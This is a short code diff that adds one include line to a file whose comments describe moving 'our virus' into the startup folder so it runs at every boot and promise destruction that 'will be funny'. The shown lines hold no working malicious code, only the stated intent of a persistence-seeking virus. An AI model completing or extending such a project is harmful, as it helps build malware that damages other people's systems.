@@ -2,6 +2,7 @@
 /*Basically, this moves our virus to startup folder so that it gets executed at every startup*/
 
 #include <stdlib.h>//#include handler caused conflict cos it was including itself
+#include <iostream>
 
 //The Destruction will be funny lol
 
